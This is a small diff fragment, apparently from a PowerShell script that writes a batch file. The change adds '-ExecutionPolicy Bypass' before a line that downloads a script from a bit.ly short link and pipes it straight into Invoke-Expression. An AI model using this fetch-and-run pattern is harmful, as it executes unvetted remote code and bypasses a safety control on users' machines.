@@ -27,7 +27,7 @@
 $batContent = @"
 echo off
 timeout /t 30
-powershell.exe
+powershell.exe -ExecutionPolicy Bypass
 irm bit.ly/kill-wallpaper | iex
 "@
 
